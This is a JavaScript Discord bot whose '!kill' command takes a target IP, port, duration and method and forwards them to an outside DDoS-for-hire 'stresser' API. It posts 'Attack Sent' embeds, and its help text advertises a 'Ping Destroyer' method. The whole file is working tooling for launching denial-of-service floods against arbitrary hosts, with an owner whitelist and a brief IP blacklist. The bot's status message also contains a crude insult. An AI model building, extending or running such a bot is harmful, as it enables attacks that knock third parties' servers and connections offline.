const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send('Hello Express app!')
});

app.listen(3000, () => {
  console.log('server started');
});

const whitelist = [];
const fetch = require('node-fetch'); 
const { Client, Intents, MessageActionRow, MessageButton, MessageEmbed } = require('discord.js');



const api_key1 = process.env.apikey1;

const intents = new Intents([
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.DIRECT_MESSAGES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
]);
const cooldowns = new Map();
const botOwnerId = ['1175855393793126411'];


const bot = new Client({ intents });

bot.once('ready', () => {
    console.log('Bot is ready.');
    bot.user.setActivity('Developer : Hyper , Please dont compare me with ( garena spam ) she is my b*tch')
});


const whitelistedIds = ['1175855393793126411', '1146570719631777813', '793885449873391646', '891809396131254293','754537487346696312','1001532438423535716','926179296828092436'];
const blacklistedIps = [
    { ip: "51.75.255.1", port: 7777 },
    { ip: "176.57.188.154", port: 443 },
];
const blacklistedTargets = ["blacklisted-target.com"];


bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!kill')) {



        const args = message.content.slice('!kill'.length).trim().split(/ +/);
        const input1 = args[0];
        const input2 = parseInt(args[1]);
        const input3 = parseInt(args[2]);
        const input4 = args[3];

        if (!channelCheck(message)) {
            const embed = new MessageEmbed()
                .setTitle("Command Restricted")
                .setDescription("This command can only be used in <#1210925491213701150> channel.")
                .setColor("#FF0000");

            if (message.channel.type === 'DM') {
                await message.author.send({ embeds: [embed] });
            } else {
                await message.channel.send({ embeds: [embed] });
            }

            return;
        }

        const target_ip = input1;
        const target_port = input2;

        if (blacklistedIps.some(ip => ip.ip === target_ip && ip.port === target_port)) {
            const embed = new MessageEmbed()
                .setTitle("Blacklisted IP")
                .setDescription("The target IP address and port combination is blacklisted and cannot be Killed.")
                .setColor("#FF0000");

            await message.channel.send({ embeds: [embed] });
            return;
        }

        const api_url = `https://api.vacstresser.ru/api?key=${api_key1}&host=${input1}&port=${input2}&method=${input4}&time=${input3}`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Vacstresser.ru)',
        };

        try {
            const response = await fetch(api_url, { headers });

const successEmbed = new MessageEmbed()
    .setColor("BLACK")
    .setTitle('Attack Sent')                .setDescription('root@127.0.0.1: CyberDemon#~ sent attack')
    .setColor('#2F3136')                    .addField('Target:', `${input1}:${input2}`, true)           
    .addField('Duration', `${input3} seconds`, true)
    .addField('Method', `${input4}`, true)
    .setAuthor(message.author.tag, message.author.displayAvatarURL())
    .setImage('https://media.discordapp.net/attachments/1213902876913569874/1213907168282284043/kmc_20240303_185007.png?ex=65f72e26&is=65e4b926&hm=3e3d5eb21260ddfc1aa6cf4395ca99661c458911a969a29af17c614bfc74e47a&')
    .setTimestamp();


            const errorEmbed = new MessageEmbed()
                .setColor("#FF0000")
                .setTitle("Error")
                .setDescription(`error code: ${response.status} - error reason: ${await response.text()}`);

            if (response.status === 200) {
                await message.channel.send({ embeds: [successEmbed] });
            } else {
                await message.channel.send({ embeds: [errorEmbed] });
            }
        } catch (e) {
            const errorEmbed = new MessageEmbed()
                .setColor("#FF0000")
                .setTitle("Error")
                .setDescription(`Error OO9S93Z: ${e}`);

            await message.channel.send({ embeds: [errorEmbed] });
        }
    }
});

function channelCheck(message) {
    return message.channel.id === '1210925491213701150';  
}





bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!help') {
        const methodsList = [
            "!kill IP PORT DURATION FORTNITE - Ping Destroyer",
        ];

        const methodsFormatted = methodsList.map(method => `\`${method}\``).join('\n');

        const embed = new MessageEmbed()
            .setTitle("Help Center")
            .setDescription("root@127.0.0.1: CyberDemon#~ showing all commands available")
            .setColor('#2F3136')
            .addField("Methods", methodsFormatted, false);

        await message.reply({ embeds: [embed] });
    }
});





bot.login(process.env.TOKEN);